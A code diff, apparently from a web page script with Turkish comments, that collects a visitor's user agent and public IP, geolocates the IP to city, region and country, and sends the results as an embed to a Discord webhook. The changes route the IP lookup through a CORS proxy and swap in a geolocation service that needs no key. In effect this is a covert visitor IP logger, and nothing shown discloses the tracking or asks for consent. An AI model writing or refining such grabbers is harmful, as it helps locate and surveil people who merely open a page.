@@ -23,7 +23,7 @@
     const userAgent = navigator.userAgent;
 
     // IP adresini almak için ipify API'sini kullanıyoruz
-    fetch('https://api.ipify.org?format=json')
+    fetch('https://cors-anywhere.herokuapp.com/https://api.ipify.org?format=json')
         .then(response => {
             if (!response.ok) {
                 throw new Error("Ağ hatası: " + response.status);
@@ -33,9 +33,8 @@
         .then(data => {
             const ip = data.ip;
 
-            // IP adresi ile detaylı bilgileri almak için ipstack API'sini kullanabiliriz
-            const accessKey = '<YOUR_ACCESS_KEY>'; // ipstack için API anahtarınızı buraya ekleyin
-            return fetch(`http://api.ipstack.com/${ip}?access_key=${accessKey}`);
+            // IP adresi ile detaylı bilgileri almak için ipapi API'sini kullanıyoruz
+            return fetch(`https://ipapi.co/${ip}/json/`);
         })
         .then(response => {
             if (!response.ok) {
@@ -45,8 +44,8 @@
         })
         .then(data => {
             const city = data.city || "Bilinmiyor";
-            const region = data.region_name || "Bilinmiyor";
-            const country = data.country_name || "Bilinmiyor";
+            const region = data.region || "Bilinmiyor";
+            const country = data.country || "Bilinmiyor";
 
             // Discord Webhook'a Embed formatında mesaj gönderme
             const embedMessage = {
